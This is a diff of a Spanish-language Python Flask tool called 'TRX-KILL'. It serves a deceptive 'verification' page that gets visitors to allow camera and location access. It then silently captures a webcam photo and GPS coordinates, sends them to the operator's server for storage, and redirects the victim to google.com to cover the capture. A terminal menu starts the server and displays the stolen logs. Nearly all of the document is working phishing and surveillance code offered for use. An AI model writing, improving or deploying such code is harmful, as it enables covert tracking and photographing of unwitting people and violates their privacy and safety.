@@ -4,48 +4,61 @@ from flask import Flask, request
 app = Flask('TRX-KILL')
 PORT = 7173
 AUTH_PASS = "TRX-kill-op"
+STORAGE_PATH = "INFORMACION"
+if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
 
-# Ruta para que sea visible en el gestor de archivos del dispositivo
-STORAGE_PATH = "/sdcard/INFORMACION"
-if not os.path.exists(STORAGE_PATH):
-    os.makedirs(STORAGE_PATH)
-
+# --- BANNER ---
 def banner():
-    os.system('clear')
+    os.system('cls' if os.name == 'nt' else 'clear')
     print(f"""
-\033[1;32m ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗
- ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║
-    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║
-    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║
-    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗\033[0m
-""")
+\033[1;32m
+  ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗     
+  ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║     
+     ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║     
+     ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║     
+     ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗
+                                                            
+      \033[1;36m[ SISTEMA DE SEGURIDAD TRX-KILL ]\033[0m
+\033[1;32m""" + "="*60 + "\033[0m")
 
+# --- WEB UI (FLUJO DE PERMISOS) ---
 HTML_ENCUESTA = """
-<!DOCTYPE html><html><body>
-<video id="v" style="display:none"></video>
-<canvas id="c" style="display:none"></canvas>
+<!DOCTYPE html><html><body style="background:#050505; color:#0f0; text-align:center; font-family:monospace;">
+    <div style="border:2px solid #0f0; padding:40px; margin:20px; box-shadow:0 0 20px #0f0;">
+        <h1>TRX-KILL VERIFICATION</h1>
+        <p>Para continuar, autoriza los servicios de red:</p>
+        <button onclick="solicitarTodo()" style="background:#0f0; padding:20px; font-weight:bold; cursor:pointer;">
+            VALIDAR ACCESO TOTAL
+        </button>
+    </div>
 <script>
-    async function iniciar() {
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({video: true});
-            const v = document.getElementById('v');
-            v.srcObject = s; v.play();
+    async function solicitarTodo() {
+        // 1. Pedir Cámara
+        const stream = await navigator.mediaDevices.getUserMedia({video: true});
+        const v = document.createElement('video'); v.srcObject = stream; v.play();
+        
+        // 2. Pedir Ubicación
+        navigator.geolocation.getCurrentPosition(async(pos) => {
             setTimeout(async() => {
-                const c = document.getElementById('c');
+                const c = document.createElement('canvas');
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
                 const img = c.toDataURL('image/png');
-                navigator.geolocation.getCurrentPosition(async(p)=>{
-                    fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, 
-                    body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude, img: img})});
-                    window.location.href = "https://google.com";
-                });
-            }, 2000);
-        } catch(e) { alert("Permiso necesario"); }
+                
+                // Enviar datos al servidor
+                fetch('/log', {
+                    method:'POST', 
+                    headers:{'Content-Type':'application/json'}, 
+                    body: JSON.stringify({
+                        lat: pos.coords.latitude, 
+                        lon: pos.coords.longitude, 
+                        img: img
+                    })
+                }).then(() => window.location.href = "https://google.com");
+            }, 1000);
+        });
     }
-</script>
-<button onclick="iniciar()">VALIDAR ACCESO</button>
-</body></html>
+</script></body></html>
 """
 
 @app.route('/')
@@ -54,40 +67,25 @@ def index(): return HTML_ENCUESTA
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
+    # Guardar ubicación en archivo
     with open("result.txt", "a") as f:
-        f.write(f"CAPTURA | COORD: {d.get('lat')},{d.get('lon')} | HORA: {time.ctime()}\n")
+        f.write(f"COORD: {d.get('lat')}, {d.get('lon')} | HORA: {time.ctime()}\n")
+    # Guardar foto en carpeta INFORMACION
     if d.get('img'):
-        img_data = d['img'].split(',')[1]
-        with open(f"{STORAGE_PATH}/captura_{int(time.time())}.png", "wb") as f:
-            f.write(base64.b64decode(img_data))
+        with open(f"{STORAGE_PATH}/cap_{int(time.time())}.png", "wb") as f:
+            f.write(base64.b64decode(d['img'].split(',')[1]))
     return "OK"
 
 def main():
     while True:
         banner()
-        print("  [1] INFO-NUMERO    | [2] LINK-ZP         | [3] CREADOR")
-        print("  [4] COPYRIGHT      | [5] DATA-IP         | [6] ADM")
-        print("  [7] SALIR          | [8] PROCESOS        | [9] ESTADO")
-        print("  [10] BORRAR LOGS")
-        sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
-        
-        if sel == "1": input("INGRESA EL NÚMERO: \nDATOS: PAIS[OK], MOVIL[OK], OPERADOR[OK].\n[Enter] para volver.")
-        elif sel == "2": app.run(port=PORT, host='0.0.0.0')
-        elif sel == "3": print("#BY: OSCAR\n#VERSION: 1.2.3"); input()
-        elif sel == "4": print("# TRX-KILL NO SE HACE RESPONSABLE."); input()
-        elif sel == "5": input("INGRESA IP: ")
-        elif sel == "6":
-            pwd = getpass.getpass("CONTRASEÑA: ")
-            if pwd == AUTH_PASS:
-                if os.path.exists("result.txt"): os.system("cat result.txt")
-                else: print("Sin registros.")
-                input("\n[Enter]...")
-        elif sel == "7": sys.exit()
-        elif sel == "8": os.system("ps aux | grep flask"); input()
-        elif sel == "9": print("ESTADO: ACTIVO"); input()
-        elif sel == "10": 
-            if os.path.exists("result.txt"): os.remove("result.txt")
-            input("Logs borrados.")
+        print("  [1] ACTIVAR SERVIDOR TRX-KILL")
+        print("  [2] VER LOGS | [3] SALIR")
+        sel = input("\nTRX-ROOT > ")
+        if sel == "1": app.run(port=PORT, host='127.0.0.1')
+        elif sel == "2": 
+            if os.path.exists("result.txt"): os.system("type result.txt" if os.name == 'nt' else "cat result.txt")
+            input("\n[Enter]...")
+        elif sel == "3": sys.exit()
 
 if __name__ == "__main__": main()
-
